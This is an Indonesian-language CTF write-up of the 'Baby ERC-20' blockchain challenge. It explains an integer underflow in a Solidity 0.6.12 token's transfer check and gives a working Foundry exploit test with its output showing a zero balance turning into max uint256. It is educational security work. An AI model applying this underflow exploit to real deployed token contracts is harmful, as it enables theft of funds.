# Baby ERC-20 **[LOCAL SIMULATION]**

> **NOTE:** WriteUp ini dibuat berdasarkan simulasi solver di lingkungan lokal (Foundry) karena instance challenge sedang tidak aktif.

## Overview

* **Judul**: Baby ERC-20
* **Kategori**: Blockchain
* **Poin**: 1000 pts
* **Author**: shiro
* **Deskripsi**: Eksploitasi kerentanan dasar pada standar ERC-20 implementasi lama.
* **URL**: `https://gzcli.1pc.tf/tcp1p-ctf-2024-archive-blockchain-baby-erc-20` (Archive)

## Informasi Attachment

* `HCOIN.sol`: Implementasi token ERC-20 kustom dengan versi Solidity `0.6.12`.
* `Setup.sol`: Kontrak deployment yang menetapkan kondisi kemenangan (`balance > 1000 ether`).

## Analisis Vulnerability

Kerentanan utama adalah **Integer Underflow** (Arithmetic Underflow).

### 1. Solidity Versioning

Kontrak menggunakan `pragma solidity 0.6.12`. Sebelum versi `0.8.0`, Solidity tidak memiliki pemeriksaan otomatis untuk *arithmetic overflow/underflow*. Pengembang harus menggunakan library seperti `SafeMath` untuk mencegahnya, namun `HCOIN.sol` tidak menggunakannya.

### 2. Logic Flaw

Pada fungsi `transfer`, terdapat pengurangan saldo tanpa validasi yang benar untuk tipe data `uint256`.

```solidity
function transfer(address _to, uint256 _value) public returns (bool success) {
    require(_to != address(0), "ERC20: transfer to the zero address");
    
    // VULNERABILITY:
    // Jika balanceOf[msg.sender] = 0 dan _value = 1:
    // 0 - 1 = 2^256 - 1 (Underflow menjadi angka maksimum uint256)
    // Angka maksimum >= 0, sehingga require ini LOLOS.
    require(balanceOf[msg.sender] - _value >= 0, "Insufficient Balance");
    
    // Saldo dikurangi: 0 - 1 = 2^256 - 1
    balanceOf[msg.sender] -= _value; 
    
    balanceOf[_to] += _value;
    emit Transfer(msg.sender, _to, _value);
    return true;
}

```

Karena pengecekan `require` dilakukan secara manual menggunakan operasi pengurangan (`-`) yang rentan underflow, kondisi "Insufficient Balance" gagal mendeteksi saldo yang tidak cukup.

## Skenario Eksploitasi

1. **Setup**: Deploy kontrak dan daftarkan alamat attacker sebagai `player`. Saldo awal attacker adalah 0.
2. **Trigger Underflow**:
* Panggil fungsi `transfer` ke alamat sembarang (misal `0xdead`).
* Masukkan nilai `_value` sebesar `1` wei.


3. **Result**:
* Perhitungan: `0 - 1` menyebabkan underflow.
* Saldo attacker berubah menjadi `115792089237316195423570985008687907853269984665640564039457584007913129639935` (Max Uint256).
* Kondisi `isSolved()` (`balance > 1000 ether`) terpenuhi.



## Script Solver (`test/Local-Solve.t.sol`)

Karena adanya konflik versi antara `forge-std` (modern) dan kontrak soal (jadul), script solver menggunakan `pragma solidity 0.6.12` dengan fitur `experimental ABIEncoderV2` diaktifkan agar kompatibel dengan library Foundry.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12; 
pragma experimental ABIEncoderV2; // Diperlukan untuk kompatibilitas forge-std pada versi 0.6

import "forge-std/Test.sol";
import "../src/Setup.sol";
import "../src/HCOIN.sol";

contract LocalSolve is Test {
    Setup setup;
    HCOIN coin;
    address attacker = address(0x1337);

    function setUp() public {
        // Deploy setup
        setup = new Setup{value: 1 ether}();
        coin = setup.coin();
        
        // Register attacker
        vm.startPrank(attacker, attacker); 
        setup.setPlayer(attacker);
        vm.stopPrank();
    }

    function test_Exploit() public {
        vm.startPrank(attacker);

        console.log("=== START EXPLOIT ===");
        console.log("Initial Balance:", coin.balanceOf(attacker));

        // Trigger Underflow: Transfer 1 wei saat saldo 0
        console.log("Triggering Underflow...");
        coin.transfer(address(0xdead), 1);

        uint256 finalBalance = coin.balanceOf(attacker);
        console.log("Balance After Exploit:");
        console.logUint(finalBalance);

        // Verifikasi Kemenangan
        bool solved = setup.isSolved();
        console.log("Is Solved?", solved);
        
        assertTrue(finalBalance > 1000 ether, "Underflow Gagal!");
        assertTrue(solved, "Challenge not solved!");
        
        vm.stopPrank();
    }
}

```

## Output Terminal

```bash
$ forge test --match-path test/Local-Solve.t.sol -vv

[PASS] test_Exploit() (gas: 80749)
Logs:
  === START EXPLOIT ===
  Initial Balance: 0
  Triggering Underflow...
  Balance After Exploit:
  115792089237316195423570985008687907853269984665640564039457584007913129639935
  Is Solved? true

```
